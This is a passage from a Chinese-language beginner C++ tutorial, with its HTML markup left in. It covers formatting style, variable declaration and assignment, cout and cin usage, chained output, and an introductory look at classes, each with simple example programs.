class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>示例 (不良格式，但语法正确):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;<span class="keyword">int</span> score=<span class="number">100</span>;<span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Initial score: &quot;</span>&lt;&lt;score&lt;&lt;<span class="built_in">std</span>::<span class="built_in">endl</span>;<span class="keyword">if</span>(score&gt;<span class="number">90</span>)&#123;<span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Excellent!&quot;</span>&lt;&lt;<span class="built_in">std</span>::<span class="built_in">endl</span>;score=score+<span class="number">5</span>;&#125;<span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Final score: &quot;</span>&lt;&lt;score&lt;&lt;<span class="built_in">std</span>::<span class="built_in">endl</span>;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure><p>虽然第二个示例也能编译运行，但极难阅读和理解。遵循一致的、清晰的格式化风格是专业编程的重要组成部分。</p><h2 id="2-2-C-语句"><a href="#2-2-C-语句" class="headerlink" title="2.2 C++语句"></a>2.2 C++语句</h2><p>C++程序由一系列语句组成。语句是C++程序的基本执行单元，通常以分号 <code>;</code> 结尾。本节将介绍两种基本的语句：声明语句和赋值语句，并进一步探讨 <code>cout</code> 的用法。</p><h3 id="2-2-1-声明语句和变量"><a href="#2-2-1-声明语句和变量" class="headerlink" title="2.2.1 声明语句和变量"></a>2.2.1 声明语句和变量</h3><p><strong>声明语句 (Declaration Statement)</strong> 用于向编译器声明程序中将要使用的<strong>变量 (Variable)</strong> 的名称和类型。</p><p><strong>变量</strong> 是计算机内存中用于存储数据的一块区域，并且有一个名字（标识符）。通过变量名，我们可以访问和修改存储在内存中的数据。在使用变量之前，必须先声明它。</p><p><strong>声明变量的语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typeName variableName; </span><br></pre></td></tr></table></figure><ul><li>  <code>typeName</code>: 指定变量要存储的数据类型（例如 <code>int</code> 表示整数，<code>double</code> 表示浮点数）。</li><li>  <code>variableName</code>: 你为变量选择的名称（标识符）。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 声明一个名为 carrots 的整型变量</span></span><br><span class="line">    <span class="keyword">int</span> carrots; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明多个同类型的变量</span></span><br><span class="line">    <span class="keyword">int</span> dogs, cats; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明并同时初始化变量 (赋初值)</span></span><br><span class="line">    <span class="keyword">int</span> fleas = <span class="number">10</span>; </span><br><span class="line">    <span class="keyword">double</span> price = <span class="number">99.99</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// C++11 列表初始化 (更推荐)</span></span><br><span class="line">    <span class="keyword">int</span> hamsters = &#123;<span class="number">5</span>&#125;; </span><br><span class="line">    <span class="keyword">int</span> gerbils&#123;<span class="number">8</span>&#125;; <span class="comment">// 花括号可以省略等号</span></span><br><span class="line">    <span class="keyword">int</span> rats&#123;&#125;;     <span class="comment">// 初始化为 0</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ... 后续可以使用这些变量 ...</span></span><br><span class="line"></span><br><span class="line">    carrots = <span class="number">25</span>; <span class="comment">// 赋值</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I have &quot;</span> &lt;&lt; carrots &lt;&lt; <span class="string">&quot; carrots.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Fleas: &quot;</span> &lt;&lt; fleas &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hamsters: &quot;</span> &lt;&lt; hamsters &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Rats: &quot;</span> &lt;&lt; rats &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <strong>声明 (Declaration):</strong> 告诉编译器变量的名称和类型。</li><li>  <strong>定义 (Definition):</strong> 声明通常也是定义，因为它会为变量分配内存空间。</li><li>  <strong>初始化 (Initialization):</strong> 在声明变量的同时给它赋一个初始值。这是一个好习惯，可以避免使用未定义的值。</li></ul><h3 id="2-2-2-赋值语句"><a href="#2-2-2-赋值语句" class="headerlink" title="2.2.2 赋值语句"></a>2.2.2 赋值语句</h3><p><strong>赋值语句 (Assignment Statement)</strong> 用于将一个值赋给一个变量。它使用赋值运算符 <code>=</code>。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">variableName = value;</span><br></pre></td></tr></table></figure><ul><li>  <code>variableName</code>: 要接收值的变量的名称（必须是已声明的变量）。</li><li>  <code>value</code>: 要赋给变量的值。这可以是一个字面常量（如 <code>25</code>）、另一个变量、或一个表达式的结果。</li></ul><p><strong>重要概念:</strong></p><ul><li>  赋值操作是将<strong>右侧</strong>的值复制到<strong>左侧</strong>的变量中。</li><li>  左侧必须是一个可修改的**左值 (lvalue)**，通常就是一个变量名。</li><li>  右侧可以是一个**右值 (rvalue)**，即一个可以产生值的表达式。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> carrots; <span class="comment">// 声明变量</span></span><br><span class="line">    </span><br><span class="line">    carrots = <span class="number">25</span>; <span class="comment">// 赋值语句：将 25 赋给 carrots</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Now I have &quot;</span> &lt;&lt; carrots &lt;&lt; <span class="string">&quot; carrots.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    carrots = carrots - <span class="number">1</span>; <span class="comment">// 赋值语句：将表达式 carrots - 1 的结果 (24) 赋给 carrots</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Crunch, crunch. Now I have &quot;</span> &lt;&lt; carrots &lt;&lt; <span class="string">&quot; carrots.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> dogs = <span class="number">5</span>; <span class="comment">// 声明并初始化</span></span><br><span class="line">    <span class="keyword">int</span> cats;     <span class="comment">// 声明</span></span><br><span class="line">    </span><br><span class="line">    cats = dogs;  <span class="comment">// 赋值语句：将 dogs 的值 (5) 赋给 cats</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dogs: &quot;</span> &lt;&lt; dogs &lt;&lt; <span class="string">&quot;, Cats: &quot;</span> &lt;&lt; cats &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可以链式赋值 (从右向左执行)</span></span><br><span class="line">    <span class="keyword">int</span> a, b, c;</span><br><span class="line">    a = b = c = <span class="number">10</span>; <span class="comment">// c=10, 然后 b=c (即 b=10), 然后 a=b (即 a=10)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a=&quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot;, b=&quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot;, c=&quot;</span> &lt;&lt; c &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-3-cout的新花样"><a href="#2-2-3-cout的新花样" class="headerlink" title="2.2.3 cout的新花样"></a>2.2.3 cout的新花样</h3><p>我们在 2.1.6 节已经学习了如何使用 <code>cout</code> 输出字符串和使用 <code>endl</code> 换行。<code>cout</code> 的一个强大之处在于它的“智能”，它可以识别并正确显示多种不同类型的数据。</p><p><code>cout</code> 对象与插入运算符 <code>&lt;&lt;</code> 结合使用，可以自动处理 C++ 的内置数据类型，如整数 (<code>int</code>)、浮点数 (<code>double</code>, <code>float</code>)、字符 (<code>char</code>) 以及 C 风格字符串和 <code>std::string</code> 对象。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt; // 包含 string 类</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age = <span class="number">30</span>;</span><br><span class="line">    <span class="keyword">double</span> weight = <span class="number">65.5</span>;</span><br><span class="line">    <span class="keyword">char</span> initial = <span class="string">&#x27;J&#x27;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name = <span class="string">&quot;Alice&quot;</span>; <span class="comment">// C++ string 对象</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* city = <span class="string">&quot;New York&quot;</span>; <span class="comment">// C 风格字符串</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// cout 可以自动处理不同类型</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--- Personal Information ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出整数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Age: &quot;</span>; <span class="comment">// 输出提示信息</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; age;     <span class="comment">// 输出 age 变量的值 (整数)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 换行</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出浮点数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Weight: &quot;</span> &lt;&lt; weight &lt;&lt; <span class="string">&quot; kg&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 链式输出</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出字符</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Initial: &quot;</span> &lt;&lt; initial &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出 C++ string 对象</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: &quot;</span> &lt;&lt; name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出 C 风格字符串</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;City: &quot;</span> &lt;&lt; city &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 混合输出</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; name &lt;&lt; <span class="string">&quot; is &quot;</span> &lt;&lt; age &lt;&lt; <span class="string">&quot; years old and lives in &quot;</span> &lt;&lt; city &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出表达式结果</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Next year, &quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot; will be &quot;</span> &lt;&lt; age + <span class="number">1</span> &lt;&lt; <span class="string">&quot; years old.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>cout</code> 之所以能做到这一点，是因为 <code>&lt;&lt;</code> 运算符针对不同的数据类型进行了**重载 (Overloading)**（我们将在后续章节详细学习）。简单来说，就是为 <code>&lt;&lt;</code> 运算符定义了多个版本，每个版本知道如何处理特定类型的数据，并将它们转换为适合输出的字符序列。</p><h2 id="2-3-其他C-语句"><a href="#2-3-其他C-语句" class="headerlink" title="2.3 其他C++语句"></a>2.3 其他C++语句</h2><p>本节将介绍更多C++语句，包括如何从用户那里获取输入，如何更灵活地使用 <code>cout</code>，并对C++的核心概念——类进行初步介绍。</p><h3 id="2-3-1-使用cin"><a href="#2-3-1-使用cin" class="headerlink" title="2.3.1 使用cin"></a>2.3.1 使用cin</h3><p>与 <code>cout</code> 用于输出类似，<code>cin</code> 是 <code>iostream</code> 库中预定义的一个对象，代表标准输入流，通常连接到键盘。我们可以使用 <code>cin</code> 来读取用户输入的数据。</p><p><code>&gt;&gt;</code> 运算符（提取运算符）用于从 <code>cin</code> 对象获取数据，并将其存储到变量中。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; // 必须包含 iostream 以使用 cin 和 cout</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> carrots; <span class="comment">// 声明一个整型变量来存储输入</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;How many carrots do you have?&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 提示用户输入</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; carrots; <span class="comment">// 从键盘读取一个整数，并存储到 carrots 变量中</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Here are two more. &quot;</span>;</span><br><span class="line">    carrots = carrots + <span class="number">2</span>; <span class="comment">// 对变量进行操作</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 输出结果</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Now you have &quot;</span> &lt;&lt; carrots &lt;&lt; <span class="string">&quot; carrots.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取其他类型的数据</span></span><br><span class="line">    <span class="keyword">double</span> price;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter the price per carrot: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; price; <span class="comment">// 读取一个浮点数</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The total cost for &quot;</span> &lt;&lt; carrots &lt;&lt; <span class="string">&quot; carrots is: &quot;</span> </span><br><span class="line">              &lt;&lt; carrots * price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>#include &lt;iostream&gt;</code>: 使用 <code>cin</code> 同样需要包含此头文件。</li><li>  <code>std::cin</code>: <code>cin</code> 对象也位于 <code>std</code> 名称空间中。</li><li>  <code>cin &gt;&gt; variable;</code>: 提取运算符 <code>&gt;&gt;</code> 从输入流（键盘）中读取数据，并根据 <code>variable</code> 的类型进行解释，然后将值存入 <code>variable</code>。<code>cin</code> 也会根据读取的数据类型自动进行转换。</li><li>  <strong>输入分隔:</strong> <code>cin</code> 通常使用空白（空格、制表符、换行符）来分隔不同的输入项。例如，如果程序期望读取两个整数 <code>cin &gt;&gt; a &gt;&gt; b;</code>，用户可以输入 <code>10 20</code> 然后按 Enter，或者输入 <code>10</code> 按 Enter 再输入 <code>20</code> 按 Enter。</li></ul><h3 id="2-3-2-使用cout进行拼接"><a href="#2-3-2-使用cout进行拼接" class="headerlink" title="2.3.2 使用cout进行拼接"></a>2.3.2 使用cout进行拼接</h3><p>我们在前面已经看到如何使用 <code>cout</code> 和插入运算符 <code>&lt;&lt;</code> 输出单个值或字符串。<code>cout</code> 的一个便捷之处在于，你可以在一条语句中连续使用 <code>&lt;&lt;</code> 运算符，将多个输出项“拼接”在一起。这称为**链式输出 (Chaining Output)**。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt; // 包含 string 类型</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age = <span class="number">28</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name = <span class="string">&quot;Bob&quot;</span>;</span><br><span class="line">    <span class="keyword">double</span> weight = <span class="number">75.3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不使用拼接的写法 (多条语句)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; name;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;, Age: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; age;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;, Weight: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; weight;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用拼接的写法 (单条语句，更简洁)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: &quot;</span> &lt;&lt; name </span><br><span class="line">              &lt;&lt; <span class="string">&quot;, Age: &quot;</span> &lt;&lt; age </span><br><span class="line">              &lt;&lt; <span class="string">&quot;, Weight: &quot;</span> &lt;&lt; weight </span><br><span class="line">              &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 拼接不同类型的数据</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;In 5 years, &quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot; will be &quot;</span> &lt;&lt; (age + <span class="number">5</span>) &lt;&lt; <span class="string">&quot; years old.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>cout &lt;&lt; item1 &lt;&lt; item2 &lt;&lt; item3;</code>: <code>cout</code> 对象在处理完第一个 <code>&lt;&lt; item1</code> 后，会返回自身 (<code>cout</code>)，因此可以继续处理下一个 <code>&lt;&lt; item2</code>，以此类推。</li><li>  这种链式调用使得将变量值、字符串字面量和表达式结果组合输出变得非常方便和易读。</li></ul><h3 id="2-3-3-类简介"><a href="#2-3-3-类简介" class="headerlink" title="2.3.3 类简介"></a>2.3.3 类简介</h3><p><strong>类 (Class)</strong> 是C++的核心概念，也是面向对象编程（OOP）的基础。可以把类看作是创建<strong>对象 (Object)</strong> 的蓝图或模板。</p><ul><li>  <strong>封装 (Encapsulation):</strong> 类将<strong>数据（称为成员变量或属性）</strong>和<strong>操作这些数据的函数（称为成员函数或方法）</strong>捆绑在一起。</li><li>  <strong>抽象 (Abstraction):</strong> 类提供了一个接口（通过其公有成员函数），隐藏了内部实现的复杂细节。</li></ul><p>我们已经在使用类的对象了！<code>cout</code> 和 <code>cin</code> 就是 C++ 标准库中定义的类的对象：</p><ul><li>  <code>cout</code> 是 <code>ostream</code> 类（输出流类）的一个对象。</li><li>  <code>cin</code> 是 <code>istream</code> 类（输入流类）的一个对象。</li></ul><p><code>ostream</code> 类定义了如何处理输出，包括 <code>&lt;&lt;</code> 运算符如何针对不同数据类型工作。<code>istream</code> 类定义了如何处理输入，包括 <code>&gt;&gt;</code> 运算符如何读取数据。</p><p><strong>概念理解:</strong></p><p>想象一下 “汽车” 这个<strong>类</strong>：</p><ul><li>  <strong>数据/属性 (成员变量):</strong> 颜色、品牌、型号、当前速度、油量等。</li><li>  <strong>操作/行为 (成员函数):</strong> 启动()、加速()、刹车()、鸣笛()、获取当前速度() 等。</li></ul><p>根据这个 “汽车” 类，我们可以创建具体的<strong>对象</strong>，比如 “我的蓝色丰田卡罗拉” 或 “邻居的红色法拉利”。每个对象都有自己的属性值（不同的颜色、品牌等），但它们都共享类定义的行为（都可以启动、加速、刹车）。</p><p><strong>示例 (概念性，非完整代码):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这是一个非常简化的概念展示，不是完整的 C++ 类定义</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>: <span class="comment">// 公有接口，外部可以访问</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">startEngine</span><span class="params">()</span></span>; <span class="comment">// 成员函数声明</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">accelerate</span><span class="params">(<span class="keyword">int</span> amount)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">displayInfo</span><span class="params">()</span></span>; </span><br><span class="line">    </span><br><span class="line"><span class="keyword">private</span>: <span class="comment">// 私有数据，外部不能直接访问，只能通过成员函数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> color;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> brand;</span><br><span class="line">    <span class="keyword">int</span> currentSpeed;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... 在程序的其他地方 ...</span></span><br><span class="line"><span class="comment">// Car myCar; // 创建一个 Car 类的对象 (需要构造函数等，此处省略)</span></span><br><span class="line"><span class="comment">// myCar.startEngine(); // 调用对象的成员函数</span></span><br><span class="line"><span class="comment">// myCar.accelerate(50);</span></span><br><span class="line"><span class="comment">// myCar.displayInfo(); </span></span><br></pre></td></tr></table></figure><p>在后续章节中，我们将深入学习如何定义和使用自己的类。目前，只需理解类是定义数据和相关操作的一种方式，而对象是类的具体实例，<code>cout</code> 和 <code>cin</code> 就是我们已经接触到的对象实例。</p><h2 id="2-4-函数"><a href="#2-4-函数" class="headerlink" title="2.4 函数"></a>2.4 函数</h2><p>函数是C++程序的构建块，它们是执行特定任务的命名代码段。使用函数可以使程序模块化、更易于理解和维护。本节将介绍如何使用和定义函数。</p><h3 id="2-4-1-使用有返回值的函数"><a href="#2-4-1-使用有返回值的函数" class="headerlink" title="2.4.1 使用有返回值的函数"></a>2.4.1 使用有返回值的函数</h3><p>许多C++函数会执行一个操作并返回一个值给调用它的代码。这种函数被称为**有返回值的函数 (Function with Return 